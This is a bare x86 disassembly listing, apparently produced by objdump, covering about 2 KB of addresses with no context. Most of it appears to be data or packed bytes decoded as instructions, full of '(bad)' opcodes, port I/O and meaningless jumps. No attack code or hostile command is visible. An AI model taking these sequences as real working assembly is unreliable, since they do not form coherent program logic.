  415ba4:	pop    esp
  415ba5:	inc    esi
  415ba6:	cli    
  415ba7:	fs popa 
  415ba9:	pop    edx
  415baa:	cli    
  415bab:	fs ins BYTE PTR es:[edi],dx
  415bad:	popa   
  415bae:	add    eax,DWORD PTR [edx+0x6c]
  415bb1:	imul   edi,DWORD PTR [esi-0x65ff8b9a],0xc2746f66
  415bbb:	sub    BYTE PTR [edi+ebx*2+0x5f],ch
  415bbf:	sub    esi,DWORD PTR [edx+0x0]
  415bc2:	imul   esp,DWORD PTR [ebp+0x6f],0x74
  415bc6:	xchg   ebx,eax
  415bc7:	movq   mm4,QWORD PTR [ebp+0x51]
  415bcb:	add    al,0x50
  415bcd:	popa   
  415bce:	jo     0x415c01
  415bd0:	add    BYTE PTR [eax+0x0],dl
	...
  415be3:	add    BYTE PTR [edx+esi*1+0x74],dh
  415be7:	add    dl,bh
  415be9:	mov    esp,DWORD PTR [esi+0x6b]
  415bec:	in     eax,0x71
  415bee:	data16 and BYTE PTR [esi-0x36ffac8c],dh
  415bf5:	adc    BYTE PTR [ebx+0x76],0xd7
  415bf9:	dec    ebx
  415bfa:	and    DWORD PTR [ebx+edx*8+0x4d],edx
  415bfe:	data16 add BYTE PTR [ecx-0x2089a9c8],ch
  415c05:	sub    esp,DWORD PTR [edx]
  415c07:	dec    eax
  415c08:	int    0x2a
  415c0a:	pop    eax
  415c0b:	add    cl,cl
  415c0d:	inc    eax
  415c0e:	push   esi
  415c0f:	jbe    0x415ba8
  415c11:	or     esp,DWORD PTR [edx]
  415c13:	push   ebx
  415c14:	test   eax,0xc9005640
  415c19:	cmp    BYTE PTR [esi+0x76],dl
  415c1c:	lahf   
  415c1d:	or     esp,DWORD PTR [edx]
  415c1f:	push   eax
  415c20:	fwait
  415c21:	jmp    0x7656:0xa90052
  415c28:	xchg   edi,eax
  415c29:	jmp    0x415c4c
  415c2b:	push   eax
  415c2c:	gs in  al,dx
  415c2e:	push   edi
  415c2f:	add    BYTE PTR [edx-0x3],cl
  415c32:	push   edi
  415c33:	push   0x7264eafa
  415c38:	fs stc 
  415c3a:	push   ebp
  415c3b:	push   esp
  415c3c:	push   ebx
  415c3d:	into   
  415c3e:	data16 add BYTE PTR [esi],bh
  415c41:	mov    ebp,0x8b1a7454
  415c46:	data16 jb 0x415c49
	...
  415c59:	add    BYTE PTR [ecx+edi*4+0x53],al
  415c5d:	and    BYTE PTR [edx-0x79],al
  415c60:	push   esp
  415c61:	je     0x415c5d
  415c63:	xchg   ecx,eax
  415c64:	bound  esi,QWORD PTR [ecx+0x2e]
  415c67:	(bad)  
  415c68:	xor    ah,BYTE PTR [ebx+0x28]
  415c6b:	mov    BYTE PTR [esi+0x72],ah
  415c6e:	fidiv  DWORD PTR [eax+0x54]
  415c71:	arpl   WORD PTR [eax],cx
  415c73:	add    eax,0x54253fe7
  415c78:	xchg   ebx,eax
  415c79:	and    ebp,DWORD PTR [ebx]
  415c7b:	bound  ebx,QWORD PTR [ecx-0x38ad26a7]
  415c81:	xor    ecx,ebp
  415c83:	push   ebx
  415c84:	jp     0x415c89
  415c86:	mov    dh,0x65
  415c88:	jp     0x415ce1
  415c8a:	sbb    dh,BYTE PTR [esp+ecx*4]
  415c8d:	push   ebp
  415c8e:	int3   
  415c8f:	popa   
  415c90:	jns    0x415cb5
  415c92:	stos   BYTE PTR es:[edi],al
  415c93:	push   edi
  415c94:	pop    ecx
  415c95:	pop    eax
  415c96:	cli    
  415c97:	cmp    BYTE PTR [eax+0x53],cl
  415c9a:	(bad)  
  415c9b:	and    al,0x3a
  415c9d:	imul   ebp,DWORD PTR [eax-0x25adbbb2],0x92584834
  415ca7:	add    al,0x2b
  415ca9:	gs stos DWORD PTR es:[edi],eax
  415cab:	push   eax
  415cac:	pop    es
  415cad:	xor    ebx,DWORD PTR [ecx-0x7796caae]
  415cb3:	and    al,0x3b
  415cb5:	dec    ebp
  415cb6:	mov    ah,BYTE PTR [ecx-0x19]
  415cb9:	inc    ebp
  415cba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cbb:	xor    al,0xc7
  415cbd:	cmp    eax,0x0
	...
  415cce:	add    BYTE PTR [eax],al
  415cd0:	push   ebp
  415cd1:	dec    edi
  415cd2:	add    BYTE PTR [edi+0x4d],ah
  415cd5:	push   ecx
  415cd6:	push   ss
  415cd7:	push   edx
  415cd8:	cli    
  415cd9:	adc    esi,DWORD PTR ds:[edx+ebx*1]
  415cdd:	inc    edx
  415cde:	push   es
  415cdf:	popa   
  415ce0:	popa   
  415ce1:	fs std 
  415ce3:	addr16 pop ecx
  415ce5:	push   ebx
  415ce6:	out    0x65,eax
  415ce8:	dec    esi
  415ce9:	push   ebp
  415cea:	retf   
  415ceb:	pop    esp
  415cec:	dec    ebx
  415ced:	push   ecx
  415cee:	add    eax,0xe7513258
  415cf3:	das    
  415cf4:	cmp    BYTE PTR [eax-0x2d],dl
  415cf7:	pop    edi
  415cf8:	sbb    DWORD PTR [ecx-0x69],edx
  415cfb:	push   ecx
  415cfc:	orps   xmm0,XMMWORD PTR [eax]
  415cff:	iret   
  415d00:	fnstenv [ebx]
  415d02:	ins    DWORD PTR es:[edi],dx
  415d03:	(bad)  
  415d04:	and    eax,0x129b5f50
  415d09:	add    eax,0x5116852e
  415d0e:	add    bh,al
  415d10:	fist   DWORD PTR [ecx+esi*2-0x17]
  415d14:	sub    BYTE PTR [eax+0x66],bl
  415d17:	jge    0x415ce5
  415d19:	and    eax,0x430d8472
  415d1e:	push   eax
  415d1f:	scas   eax,DWORD PTR es:[edi]
  415d20:	or     eax,0xb2ab5c35
  415d25:	pop    eax
  415d26:	ins    BYTE PTR es:[edi],dx
  415d27:	dec    esp
  415d28:	mov    ds:0x9d5b5024,al
  415d2d:	push   edi
  415d2e:	or     WORD PTR [eax+esi*1+0x2d50],di
	...
  415d46:	mov    ebx,0xfe576725
  415d4b:	xor    ebp,DWORD PTR [ebp+0x47]
  415d4e:	ret    0x5f4f
  415d51:	cmp    esp,DWORD PTR [ebx-0x65cbbdd8]
  415d57:	pop    eax
  415d58:	arpl   WORD PTR ds:0xe6d52ce,bx
  415d5e:	xchg   esp,eax
  415d5f:	and    al,0x51
  415d61:	push   es
  415d62:	pop    esp
  415d63:	push   ecx
  415d64:	jne    0x415d6e
  415d66:	dec    eax
  415d67:	bound  ebx,QWORD PTR [ebx+ebp*1+0x43]
  415d6b:	pop    ecx
  415d6c:	ins    BYTE PTR es:[edi],dx
  415d6d:	add    al,0x42
  415d6f:	xor    eax,0x5f350672
  415d74:	and    BYTE PTR [edi],ah
  415d76:	adc    dh,BYTE PTR ds:0x5e25aa20
  415d7c:	arpl   di,cx
  415d7e:	and    eax,0x56c84b29
  415d83:	push   edi
  415d84:	add    BYTE PTR [edx+0x745f4c],bh
  415d8a:	fs pusha 
  415d8c:	jb     0x415df3
  415d8e:	jg     0x415dd3
  415d90:	push   eax
  415d91:	inc    esi
  415d92:	ja     0x415da5
  415d94:	pop    esp
  415d95:	inc    edx
  415d96:	inc    esi
  415d97:	and    eax,0x2167656c
  415d9c:	push   eax
  415d9d:	jb     0x415e0b
  415d9f:	data16 and BYTE PTR es:[ebp-0x73a3aff3],ah
  415da7:	xor    DWORD PTR [ecx+ebp*2+0x0],esi
	...
  415dbb:	add    BYTE PTR [edi+eiz*1+0x2680006f],cl
  415dc2:	data16 je 0x415d99
  415dc5:	pusha  
  415dc6:	jb     0x415e2d
  415dc8:	jg     0x415e0d
  415dca:	jno    0x415e38
  415dcc:	scas   eax,DWORD PTR es:[edi]
  415dcd:	pop    ebp
  415dce:	je     0x415e20
  415dd0:	mov    eax,ds:0x3666b27
  415dd5:	adc    al,0x6b
  415dd7:	data16 (bad) 
  415dd9:	das    
  415dda:	pop    ebp
  415ddb:	jb     0x415d93
  415ddd:	adc    al,0x42
  415ddf:	jne    0x415d90
  415de1:	fs popa 
  415de3:	je     0x415dd8
  415de5:	xor    ch,BYTE PTR [ebx+0x6f]
  415de8:	mov    ch,0x20
  415dea:	inc    esi
  415deb:	push   esp
  415dec:	ret    
  415ded:	and    BYTE PTR [edi],bh
  415def:	ins    BYTE PTR es:[edi],dx
  415df0:	jmp    0x7002:0x2f746e5d
  415df7:	je     0x415df3
  415df9:	popa   
  415dfa:	outs   dx,BYTE PTR ds:[esi]
  415dfb:	jae    0x415dd0
  415dfd:	cmc    
  415dfe:	push   0x66
  415e00:	out    0x59,eax
  415e02:	pop    ebp
  415e03:	jb     0x415e0b
  415e05:	cmc    
  415e06:	inc    ecx
  415e07:	push   eax
  415e08:	adc    eax,0x8f004ffd
  415e0d:	daa    
  415e0e:	outs   dx,DWORD PTR ds:[esi]
  415e0f:	je     0x415d91
  415e11:	sub    ebp,DWORD PTR [edi+0x73]
  415e14:	cli    
  415e15:	les    ebx,FWORD PTR [esi+ebp*2+0x34]
  415e19:	lds    ebx,FWORD PTR [ebp+0x63]
  415e1c:	cli    
  415e1d:	sahf   
  415e1e:	pop    edx
  415e1f:	je     0x415e21
	...
  415e31:	add    BYTE PTR [edi],dl
  415e33:	jg     0x415e7a
  415e35:	or     BYTE PTR [bp+0x6e3a],ch
  415e3a:	or     DWORD PTR [edx+0x62],edi
  415e3d:	ins    BYTE PTR es:[edi],dx
  415e3e:	push   ss
  415e3f:	jb     0x415e9b
  415e41:	jb     0x415e0e
  415e43:	lods   eax,DWORD PTR ds:[esi]
  415e44:	sbb    edi,DWORD PTR [eax-0x19]
  415e47:	mov    DWORD PTR [ecx],eax
  415e49:	pop    esp
  415e4a:	leave  
  415e4b:	inc    eax
  415e4c:	bound  esi,QWORD PTR [edx-0x12]
  415e4f:	jae    0x415e86
  415e51:	push   eax
  415e52:	cli    
  415e53:	imul   esp,DWORD PTR [edx+0x76],0xffffffe5
  415e57:	aas    
  415e58:	pop    edx
  415e59:	je     0x415e32
  415e5b:	sbb    esp,DWORD PTR ds:[ebx+ebx*8+0x61]
  415e60:	add    al,0x48
  415e62:	rcr    DWORD PTR [esi+0x58],cl
  415e65:	ins    DWORD PTR es:[edi],dx
  415e66:	test   al,0x54
  415e68:	push   ds
  415e69:	fs fwait
  415e6b:	pop    ecx
  415e6c:	add    al,0x5f
  415e6e:	sahf   
  415e6f:	push   ecx
  415e70:	push   edx
  415e71:	bound  edx,QWORD PTR [ecx-0x71a097ed]
  415e77:	lods   eax,DWORD PTR ds:[esi]
  415e78:	push   edx
  415e79:	jae    0x415e1e
  415e7b:	dec    esi
  415e7c:	push   edi
  415e7d:	cs sahf 
  415e7f:	or     al,0x58
  415e81:	add    BYTE PTR [esi+0x587254f9],bl
  415e87:	or     eax,DWORD PTR [esi+0x54]
  415e8a:	dec    edx
  415e8b:	scas   al,BYTE PTR es:[edi]
  415e8c:	xor    BYTE PTR [ebp+0x5c],ch
  415e8f:	ret    0x5f54
  415e92:	push   0x543009
	...
  415ea7:	add    BYTE PTR [edi-0x40],cl
  415eaa:	pop    edi
  415eab:	ins    DWORD PTR es:[edi],dx
  415eac:	xor    al,0x1a
  415eae:	xor    al,0x0
  415eb0:	push   ebx
  415eb1:	add    eax,0x264650d5
  415eb6:	retf   
  415eb7:	pop    edi
  415eb8:	sub    ah,BYTE PTR [esi]
  415eba:	fistp  DWORD PTR [ebx-0x6]
  415ebd:	push   edi
  415ebe:	mov    esi,0xc83c2e65
  415ec3:	push   ecx
  415ec4:	sbb    DWORD PTR [ecx-0x66],esp
  415ec7:	pop    esp
  415ec8:	push   cs
  415ec9:	es xchg ebx,eax
  415ecb:	inc    ebp
  415ecc:	xor    al,0x4b
  415ece:	xchg   ebx,eax
  415ecf:	xor    edi,edx
  415ed1:	inc    edi
  415ed2:	cdq    
  415ed3:	pushw  ss
  415ed5:	sub    cl,BYTE PTR [ebp-0x7cda22a9]
  415edb:	xor    ch,cl
  415edd:	xor    BYTE PTR [ebx-0x73c944fd],dl
  415ee3:	fnstenv [bp+si]
  415ee6:	jae    0x415f42
  415ee8:	mov    ch,0x30
  415eea:	stos   BYTE PTR es:[edi],al
  415eeb:	pop    ebx
  415eec:	fldenv [edi]
  415eee:	add    BYTE PTR [ebx],0xab
  415ef1:	xor    ecx,DWORD PTR [ebp+0x50]
  415ef4:	(bad)  
  415ef5:	and    eax,0x57d66159
  415efa:	inc    esi
  415efb:	push   eax
  415efc:	int    0x60
  415efe:	and    eax,0x1758bc42
  415f03:	sub    BYTE PTR [edi-0x58a2cccc],ch
  415f09:	xor    bh,BYTE PTR [edx]
  415f0b:	add    al,0x0
	...
  415f1d:	add    BYTE PTR [edx-0x70a8c5db],ch
  415f23:	xor    ebx,DWORD PTR [ecx]
  415f25:	pusha  
  415f26:	cli    
  415f27:	pop    ecx
  415f28:	sbb    ah,BYTE PTR [ecx+0x68]
  415f2b:	push   ebx
  415f2c:	or     BYTE PTR [ecx+0x59],bl
  415f2f:	add    eax,0x396b5b1f
  415f34:	sub    BYTE PTR [eax+0x68],ah
  415f37:	ss out 0x35,eax
  415f3a:	pop    ecx
  415f3b:	xor    BYTE PTR [eax],al
  415f3d:	push   es
  415f3e:	sub    ah,BYTE PTR [esi]
  415f40:	inc    esp
  415f41:	add    BYTE PTR [eax*1+0x3927d650],ch
  415f48:	add    BYTE PTR [ecx-0x588bcbb0],dh
  415f4e:	push   ss
  415f4f:	cs arpl cx,bp
  415f52:	jmp    0xf9fed186
  415f57:	push   ebp
  415f58:	jno    0x415f1e
  415f5a:	das    
  415f5b:	xor    ebx,DWORD PTR [edi-0x3c]
  415f5e:	sbb    al,BYTE PTR ds:0x342cc850
  415f64:	jne    0x415efc
  415f66:	daa    
  415f67:	sub    DWORD PTR [eax],eax
  415f69:	mov    cl,0xd0
  415f6b:	xor    esi,DWORD PTR [ebp+ebp*4-0x32]
  415f6f:	ss dec esi
  415f71:	mov    dl,al
  415f73:	and    eax,0x2ac09a00
  415f78:	je     0x415ff0
  415f7a:	fidiv  WORD PTR [esi]
  415f7c:	arpl   WORD PTR [ebp-0x7899d04c],dx
	...
  415f92:	add    BYTE PTR [eax],al
  415f94:	fisub  DWORD PTR ds:0xe4a65c41
  415f9a:	push   eax
  415f9b:	dec    esi
  415f9c:	cwde   
  415f9d:	cmp    BYTE PTR [ebp+0x48],dh
  415fa0:	les    esp,FWORD PTR ds:0x38c0205c
  415fa6:	arpl   WORD PTR [ebx],di
  415fa8:	shl    BYTE PTR ds:0x36ce1d74,0x6d
  415faf:	dec    edi
  415fb0:	scas   eax,DWORD PTR es:[edi]
  415fb1:	xor    BYTE PTR [ebx+0x3a],ah
  415fb4:	(bad)  
  415fb5:	push   ebx
  415fb6:	ins    DWORD PTR es:[edi],dx
  415fb7:	rsm    
  415fb9:	aaa    
  415fba:	pop    edi
  415fbb:	sbb    ebx,DWORD PTR [ebx+0x61]
  415fbe:	inc    esi
  415fbf:	cmp    eax,0x1b5f5826
  415fc4:	pop    ebx
  415fc5:	popa   
  415fc6:	inc    ecx
  415fc7:	add    BYTE PTR [ebx+edi*8],ah
  415fca:	inc    eax
  415fcb:	inc    esi
  415fcc:	out    dx,eax
  415fcd:	clc    
  415fce:	pop    ebx
  415fcf:	push   ebx
  415fd0:	cli    
  415fd1:	push   esp
  415fd2:	popa   
  415fd3:	jae    0x415fa8
  415fd5:	std    
  415fd6:	push   0x73
  415fd8:	lahf   
  415fd9:	add    eax,0x57be7351
  415fde:	add    BYTE PTR [eax-0x4c],dl
  415fe1:	push   edi
  415fe2:	je     0x415fe4
  415fe4:	arpl   si,si
  415fe6:	dec    DWORD PTR [edi+0x5f]
  415fe9:	pop    ebp
  415fea:	push   edx
  415feb:	add    BYTE PTR [eax-0x6],dh
  415fee:	inc    edi
  415fef:	add    BYTE PTR [ebx+0x57],dl
  415ff2:	imul   esp,DWORD PTR [esi-0x46],0x59
  415ff6:	popa   
  415ff7:	jae    0x415ff9
	...
  416009:	add    BYTE PTR [ebp+0x636c694d],ah
  41600f:	jmp    0xe5f4b459
  416014:	inc    eax
  416015:	js     0x415f9a
  416017:	pop    ecx
  416018:	imul   esi,DWORD PTR [edx+0x6e],0x57
  41601c:	add    BYTE PTR [ebx-0x7c],dl
  41601f:	and    esi,DWORD PTR [edi+esi*2-0x7e]
  416023:	push   edi
  416024:	popa   
  416025:	pop    esp
  416026:	popf   
  416027:	icebp  
  416028:	dec    edi
  416029:	and    BYTE PTR [esi],cl
  41602b:	push   ecx
  41602c:	jo     0x41609a
  41602e:	les    ebx,FWORD PTR [edx+0x61]
  416031:	jb     0x41601a
  416033:	inc    esi
  416034:	push   esp
  416035:	push   eax
  416036:	repz add DWORD PTR [eax+0x70],edi
  41603a:	(bad)  
  41603b:	pop    ebx
  41603c:	jb     0x4160a3
  41603e:	shr    esp,1
  416040:	push   edx
  416041:	outs   dx,DWORD PTR ds:[esi]
  416042:	rcr    DWORD PTR [edi+0x6f],1
  416045:	jo     0x415ff9
  416047:	daa    
  416048:	popa   
  416049:	pop    esp
  41604a:	mov    BYTE PTR [esi+0x3f],0x54
  41604e:	add    al,0x5e
  416050:	ins    BYTE PTR es:[edi],dx
  416051:	inc    edx
  416052:	cli    
  416053:	or     al,0x56
  416055:	sub    ebp,DWORD PTR [eax]
  416057:	fmul   QWORD PTR ds:0x4dc13800
  41605d:	je     0x4160c4
  41605f:	adc    BYTE PTR [ebx+0x0],dl
  416062:	sub    DWORD PTR [edi],eax
  416064:	bound  esi,QWORD PTR [ebp+ecx*2+0xd]
  416068:	push   esi
  416069:	arpl   WORD PTR [esi],bx
  41606b:	jo     0x41609a
  41606d:	push   eax
	...
  41607e:	add    BYTE PTR [eax],al
  416080:	fisubr DWORD PTR [eax+0x49]
  416083:	jo     0x4160a3
  416085:	(bad)  
  416086:	push   ebx
  416087:	arpl   WORD PTR [eax],bp
  416089:	jb     0x4160bc
  41608b:	jb     0x41609a
  41608d:	rcr    BYTE PTR [edx+0x6c],1
  416090:	pop    ds
  416091:	jnp    0x416094
  416093:	push   eax
  416094:	sbb    edi,DWORD PTR [ebx+0x54]
  416097:	jne    0x4160ae
  416099:	jl     0x4160f8
  41609b:	add    BYTE PTR [edx],ch
  41609d:	lea    edx,[ecx+esi*2-0x13]
  4160a1:	mov    ss,WORD PTR [ebx+0x64]
  4160a4:	(bad)  
  4160a5:	xchg   esp,eax
  4160a6:	push   ecx
  4160a7:	arpl   dx,di
  4160a9:	gs pop eax
  4160ab:	jno    0x416093
  4160ad:	lods   eax,DWORD PTR ds:[esi]
  4160ae:	xor    eax,0x5794dd6d
  4160b3:	add    BYTE PTR [edx-0x58bac7a],ch
  4160b9:	fs push edi
  4160bb:	addr16 (bad) 
  4160bd:	push   esp
  4160be:	popa   
  4160bf:	ins    BYTE PTR es:[edi],dx
  4160c0:	retf   0x504c
  4160c3:	push   0x704feffa
  4160c8:	leave  
  4160c9:	inc    esp
  4160ca:	push   eax
  4160cb:	arpl   sp,cx
  4160cd:	inc    ebp
  4160ce:	push   ebp
  4160cf:	ins    BYTE PTR es:[edi],dx
  4160d0:	cli    
  4160d1:	and    DWORD PTR [edx+0x72],eax
  4160d4:	mov    ds:0x9f74614e,eax
  4160d9:	mov    edx,0x4932e01
  4160de:	adc    eax,0x3560fa5b
  4160e3:	arpl   WORD PTR [eax],ax
	...
  4160f5:	add    BYTE PTR [ecx+ecx*2+0x10],bl
  4160f9:	pop    ebp
  4160fa:	pop    ecx
  4160fb:	popa   
  4160fc:	sub    bl,BYTE PTR [ecx+0x4c]
  4160ff:	daa    
  416100:	adc    BYTE PTR [ecx+0x36],ah
  416103:	push   esp
  416104:	add    al,0x55
  416106:	dec    ebx
  416107:	cs push es
  416109:	pop    edx
  41610a:	dec    ebx
  41610b:	add    eax,0x3459350b
  416110:	ficomp DWORD PTR [edx+0x27]
  416113:	das    
  416114:	fiadd  DWORD PTR [ebx]
  416116:	dec    ebx
  416117:	xor    ch,cl
  416119:	dec    edi
  41611a:	das    
  41611b:	fstp   DWORD PTR es:[esi+0x3e]
  41611f:	push   edi
  416120:	enter  0x3e59,0x3e
  416124:	rcr    BYTE PTR [esi+0x2e],cl
  416127:	push   esp
  416128:	int3   
  416129:	or     DWORD PTR fs:[ebx],esi
  41612c:	les    eax,FWORD PTR [ecx+0x22]
  41612f:	add    eax,0x26e458aa
  416134:	nop
  416135:	pusha  
  416136:	sbb    dl,BYTE PTR [ebp-0x78]
  416139:	dec    edi
  41613a:	rol    BYTE PTR [esp+esi*4],cl
  41613d:	push   edi
  41613e:	out    0x32,al
  416140:	mov    BYTE PTR [ecx-0x4e],al
  416143:	push   esp
  416144:	out    0x27,eax
  416146:	retf   
  416147:	sub    eax,0xeecb5e7b
  41614c:	outs   dx,BYTE PTR ds:[esi]
  41614d:	push   esi
  41614e:	into   
  41614f:	add    al,0x43
  416151:	ds into 
  416153:	push   esp
  416154:	cmp    DWORD PTR [ecx-0x55],edx
  416157:	sub    al,0xe7
  416159:	xor    DWORD PTR [eax],eax
	...
  41616b:	add    BYTE PTR [ecx-0x6accc0cd],ch
  416171:	cmp    BYTE PTR [esi+edx*1-0x6e],cl
  416175:	xor    DWORD PTR [ebx+0x4],ecx
  416178:	stos   DWORD PTR es:[edi],eax
  416179:	sub    DWORD PTR [eax],eax
  41617b:	cmp    esi,DWORD PTR [ebx+eiz*1+0x35cae972]
  416182:	arpl   WORD PTR [ebx],bx
  416184:	dec    esp
  416185:	pop    esi
  416186:	imul   eax,DWORD PTR [esi+esi*8],0x54
  41618a:	pop    edi
  41618b:	sbb    cl,BYTE PTR [ecx+0x38]
  41618e:	ins    DWORD PTR es:[edi],dx
  41618f:	sbb    ebx,DWORD PTR [edx+0x5]
  416192:	inc    esi
  416193:	std    
  416194:	sub    DWORD PTR [ebp+0x6d],edx
  416197:	sti    
  416198:	cmp    eax,0x24065105
  41619d:	cmp    DWORD PTR [ebp+0x8],esi
  4161a0:	sub    BYTE PTR [edx],ah
  4161a2:	pop    esp
  4161a3:	stos   BYTE PTR es:[edi],al
  4161a4:	dec    ebx
  4161a5:	ss arpl bx,bx
  4161a8:	aad    0x57
  4161aa:	arpl   bx,cx
  4161ac:	call   0xea05d5d6
  4161b1:	xor    DWORD PTR [edx-0x2b],esp
  4161b4:	ss xor al,0x68
  4161b7:	les    ebp,FWORD PTR [ebx]
  4161b9:	add    eax,0x3926ab5c
  4161be:	dec    ecx
  4161bf:	shl    BYTE PTR [edi],0x22
  4161c2:	js     0x4161ad
  4161c4:	(bad)  ds:0x2ece9274
  4161ca:	arpl   WORD PTR [ecx-0x168ed6f1],dx
	...
  4161e0:	add    BYTE PTR [eax],al
  4161e2:	and    DWORD PTR [eax],esi
  4161e4:	jno    0x416263
  4161e6:	scas   eax,DWORD PTR es:[edi]
  4161e7:	pop    ebp
  4161e8:	imul   eax,DWORD PTR [ecx+edi*8-0x54738eaf],0x2e
  4161f0:	pop    edi
  4161f1:	jl     0x4161cd
  4161f3:	add    al,0x50
  4161f5:	dec    eax
  4161f6:	leave  
  4161f7:	xor    esi,DWORD PTR [ebp+0x4e]
  4161fa:	enter  0x28,0x39
  4161fe:	int    0x32
  416200:	je     0x4161eb
  416202:	call   0xd741c836
  416207:	dec    ebp
  416208:	pop    ebp
  416209:	jb     0x4161c1
  41620b:	in     al,dx
  41620c:	inc    eax
  41620d:	js     0x4161d2
  41620f:	daa    
  416210:	outs   dx,BYTE PTR ds:[esi]
  416211:	inc    esp
  416212:	rcr    DWORD PTR [edi+0x76],0x65
  416216:	aas    
  416217:	repnz pusha 
  416219:	jae    0x41622b
  41621b:	pusha  
  41621c:	imul   ebp,DWORD PTR [esi+0x0],0x9
  416220:	pop    esp
  416221:	inc    ebp
  416222:	or     ebx,DWORD PTR [ecx+0x5d]
  416225:	outs   dx,BYTE PTR ds:[esi]
  416226:	daa    
  416227:	push   ebx
  416228:	gs jbe 0x416221
  41622b:	or     BYTE PTR [esp+eiz*2-0x3f],bl
  41622f:	pusha  
  416230:	jbe    0x416297
  416232:	rcl    BYTE PTR [edi],0x6a
  416235:	jae    0x4161da
  416237:	jecxz  0x4162a8
  416239:	popa   
  41623a:	rcl    BYTE PTR [edx+0x73],1
  41623d:	outs   dx,DWORD PTR ds:[esi]
  41623e:	rcr    DWORD PTR [ebp+0x22],0x20
  416242:	or     ecx,ebp
  416244:	and    DWORD PTR [eax],eax
	...
  416256:	add    BYTE PTR [eax],al
  416258:	add    DWORD PTR ds:0x5fbc5300,ebx
  41625e:	je     0x4162d7
  416260:	mov    dl,0x53
  416262:	popa   
  416263:	pop    esp
  416264:	push   esi
  416265:	dec    ecx
  416266:	jo     0x4162c9
  416268:	(bad)  
  416269:	std    
  41626a:	jno    0x4162d5
  41626c:	test   DWORD PTR [eax+eax*1],esp
  41626f:	inc    ebp
  416270:	mov    edx,DWORD PTR [ecx+0x5d]
  416273:	outs   dx,BYTE PTR ds:[esi]
  416274:	xchg   edi,eax
  416275:	push   ebx
  416276:	gs jbe 0x4161ff
  416279:	out    0x47,al
  41627b:	outs   dx,DWORD PTR ds:[esi]
  41627c:	jle    0x4162a2
  41627e:	add    BYTE PTR [ebx+0x76],dl
  416281:	push   ebx
  416282:	jbe    0x4162e9
  416284:	rol    DWORD PTR [ecx],0x51
  416287:	jae    0x41624f
  416289:	push   edx
  41628a:	dec    esi
  41628b:	popa   
  41628c:	mov    esi,0xfa50005d
  416291:	dec    esp
  416292:	dec    edi
  416293:	jno    0x41623a
  416295:	(bad)  
  416296:	push   ecx
  416297:	fs cli 
  416299:	out    0x33,al
  41629b:	pop    edi
  41629c:	mov    edx,edi
  41629e:	dec    edx
  41629f:	ins    DWORD PTR es:[edi],dx
  4162a0:	mov    BYTE PTR [edi+0x4],cl
  4162a3:	inc    esp
  4162a4:	xchg   ebx,eax
  4162a5:	stc    
  4162a6:	pop    esp
  4162a7:	popa   
  4162a8:	outs   dx,BYTE PTR ds:[esi]
  4162a9:	adc    edx,DWORD PTR [edx+0x77]
  4162ac:	cli    
  4162ad:	(bad)  
  4162ae:	push   edx
  4162af:	data16 outs dx,BYTE PTR ds:[esi]
  4162b1:	sbb    esp,DWORD PTR [ecx+0x72]
  4162b4:	push   edi
  4162b5:	jmp    0x6d30:0xce424135
	...
  4162cc:	add    BYTE PTR [eax],al
  4162ce:	push   esp
  4162cf:	mov    dl,0x4c
  4162d1:	pop    edi
  4162d2:	dec    eax
  4162d3:	or     DWORD PTR [eax],ebp
  4162d5:	inc    ecx
  4162d6:	dec    esi
  4162d7:	or     eax,0xcf23714f
  4162dc:	cmp    edx,DWORD PTR [edx+ecx*2+0x7a]
  4162e0:	cmp    edx,DWORD PTR [edx+ecx*2+0x6d]
  4162e4:	pusha  
  4162e5:	popa   
  4162e6:	or     eax,0x97453d1
  4162eb:	scas   al,BYTE PTR es:[edi]
  4162ec:	cmp    esi,DWORD PTR [edx+ecx*1-0x61]
  4162f0:	pop    esi
  4162f1:	jb     0x4162ff
  4162f3:	leave  
  4162f4:	dec    edi
  4162f5:	add    BYTE PTR [edx+esi*2],dh
  4162f8:	push   ecx
  4162f9:	push   ebx
  4162fa:	jmp    0xdb8fb287
  4162ff:	mov    BYTE PTR [esi+0x0],bl
  416302:	mov    esp,0xdb505199
  416307:	sahf   
  416308:	push   eax
  416309:	jne    0x4162f0
  41630b:	aas    
  41630c:	pop    ebp
  41630d:	add    BYTE PTR [ebp-0x558fb29d],ch
  416313:	mov    WORD PTR [eax+0x71],ss
  416316:	lds    edi,FWORD PTR [edx]
  416318:	dec    edi
  416319:	fs cli 
  41631b:	add    al,0x2d
  41631d:	push   eax
  41631e:	stos   BYTE PTR es:[edi],al
  41631f:	inc    eax
  416320:	push   eax
  416321:	push   edx
  416322:	cdq    
  416323:	daa    
  416324:	pop    ebx
  416325:	push   ebp
  416326:	test   al,0x3d
  416328:	out    0x30,eax
  41632a:	mov    DWORD PTR [edx+0x1b],0x2456cd2d
  416331:	sub    BYTE PTR [eax],al
	...
  416343:	add    BYTE PTR [edi+eax*2+0x2bab241f],dh
  41634a:	inc    ebp
  41634b:	push   eax
  41634c:	outs   dx,DWORD PTR ds:[esi]
  41634d:	sbb    DWORD PTR es:[edi+0x4e],ebx
  416351:	inc    ebx
  416352:	or     ebx,DWORD PTR [ebx+0x54]
  416355:	and    al,0x33
  416357:	inc    ebx
  416358:	pop    ebx
  416359:	sub    dh,bh
  41635b:	dec    esi
  41635c:	fs xor edx,edi
  41635f:	add    ebp,DWORD PTR [ebx]
  416361:	sub    al,0x5
  416363:	push   eax
  416364:	dec    edi
  416365:	es stc 
  416367:	pop    esi
  416368:	push   ds
  416369:	inc    ebx
  41636a:	adc    esi,DWORD PTR [ebx+edi*1]
  41636d:	sub    eax,edx
  41636f:	pop    esi
  416370:	sbb    al,0x31
  416372:	mov    ebx,0xcc311d30
  416377:	push   eax
  416378:	cli    
  416379:	push   edi
  41637a:	mov    esi,0xc8340e5d
  41637f:	push   ecx
  416380:	sbb    DWORD PTR [ecx-0x66],ebx
  416383:	push   esp
  416384:	sbb    al,0x31
  416386:	(bad)  
  416387:	adc    eax,0x27c6370f
  41638c:	mov    esp,0xde40b750
  416391:	sub    eax,0x58ee5584
  416396:	mov    edx,0x9a21e65a
  41639b:	add    esp,DWORD PTR [esp+ebp*1]
  41639e:	jg     0x416400
  4163a0:	cli    
  4163a1:	jmp    0x9500:0x4d6578d
	...
  4163b8:	add    BYTE PTR [eax],al
  4163ba:	(bad)  
  4163bb:	push   esp
  4163bc:	push   ecx
  4163bd:	jle    0x416396
  4163bf:	xor    BYTE PTR [ebp+0x48],dh
  4163c2:	in     al,0x27
  4163c4:	pop    esp
  4163c5:	and    eax,0x4a6336d7
  4163ca:	loop   0x4163f5
  4163cc:	jb     0x41641e
  4163ce:	push   ds
  4163cf:	dec    eax
  4163d0:	jo     0x41640e
